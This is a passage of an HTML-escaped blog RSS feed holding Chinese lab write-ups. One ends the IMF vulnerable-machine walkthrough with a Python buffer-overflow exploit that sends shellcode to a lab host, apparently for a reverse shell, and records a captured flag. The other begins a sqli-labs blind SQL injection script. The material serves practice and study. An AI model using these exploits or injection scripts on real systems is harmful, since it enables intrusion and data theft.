-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /usr/bin/python2&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;connect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;192.168.100.142&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7788&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;48093572&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x50\x05\x8f\x59&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;168&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x63\x85\x04\x08\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;监听本地~&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646.png&#34;
-	width=&#34;746&#34;
-	height=&#34;189&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519133457646_hud8214105bd138c3327689d74ba9d3659_99121_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519133457646&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;394&#34;
-		data-flex-basis=&#34;947px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;Flag6{R2gwc3RQcm90MGMwbHM=}&lt;/p&gt;
-&lt;p&gt;后续登录之后，php文件分析查看&lt;/p&gt;
-&lt;p&gt;upload/index.php&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561.png&#34;
-	width=&#34;892&#34;
-	height=&#34;766&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145040561_hufa85982973ed07e101868dc1e167e7ec_152244_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519145040561&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;116&#34;
-		data-flex-basis=&#34;279px&#34;
-	
-&gt;&lt;/p&gt;
-&lt;p&gt;upload/cmd.php 注入点&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147.png&#34;
-	width=&#34;773&#34;
-	height=&#34;670&#34;
-	srcset=&#34;http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_480x0_resize_box_3.png 480w, http://main1o.github.io/p/imf%E9%9D%B6%E6%9C%BA/image-20220519145238147_hud00bd2b8bc292adddcd2450c56996fbb_116109_1024x0_resize_box_3.png 1024w&#34;
-	loading=&#34;lazy&#34;
-	
-		alt=&#34;image-20220519145238147&#34;
-	
-	
-		class=&#34;gallery-image&#34; 
-		data-flex-grow=&#34;115&#34;
-		data-flex-basis=&#34;276px&#34;
-	
-&gt;&lt;/p&gt;
-</description>
-        </item>
-        <item>
-        <title>sqli_labs_5</title>
-        <link>http://main1o.github.io/p/sqli_labs_5/</link>
-        <pubDate>Fri, 24 Jun 2022 00:00:00 +0000</pubDate>
-        
-        <guid>http://main1o.github.io/p/sqli_labs_5/</guid>
-        <description>&lt;img src="http://main1o.github.io/image62.png" alt="Featured image of post sqli_labs_5" /&gt;&lt;p&gt;盲注demo:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
-&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;ch&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;@main1o
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;Sqli_labs_5
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;payloads&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;abcdefghijklmnopqrstuvwxyz0123456789_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;You are in...........&amp;#39;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;database_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;num&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;True&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;reque&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{inject}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; and (length(database()) = &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{str}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)%23&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;format&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;inject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;reque&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reque&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reque&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;sa&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;[+]当前数据库长度: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
